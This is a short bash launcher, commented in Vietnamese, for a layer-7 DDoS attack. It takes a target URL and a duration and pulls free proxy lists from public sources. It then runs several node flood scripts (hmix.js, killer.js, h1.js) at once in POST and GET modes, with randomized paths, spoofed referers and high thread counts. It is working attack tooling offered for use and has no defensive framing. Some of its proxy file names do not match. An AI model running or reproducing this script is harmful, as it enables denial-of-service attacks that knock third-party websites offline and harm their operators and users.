#!/bin/bash

# Usage: ./script.sh <URL> <TIME> 
[ $# -lt 2 ] && echo "Usage: $0 {URL} {TIME}" && exit 1

URL=$1
TIME=$2

# Tải proxy vào live.txt cho cả HTTP, HTTPS
> live.txt  # Tạo hoặc làm mới file live.txt
for type in http https; do
  curl -s "https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/${type}/Vietnam.txt" >> live.txt
  echo "" >> live.txt  # Dòng trống sau khi tải xong Vietnam.txt
  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=all&ssl=all&anonymity=all&timeout=1000&protocol=${type}" >> live.txt
  echo "" >> live.txt  # Dòng trống sau khi tải xong ProxyScrape
done
wait



# Chạy các script node
for m in POST GET; do
  node hmix.js -m $m -u $URL -s $TIME -p live1.txt -t 1 --full true -d false &
  node killer.js $m $URL $TIME 1 1 liv1.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset &
  node h1.js $m $URL live.txt $TIME 999 5 randomstring=true &
done

wait
pgrep -f "hmix.js|h1.js|h2.js|http1.js|http2.js|killer.js" | xargs -r kill -9

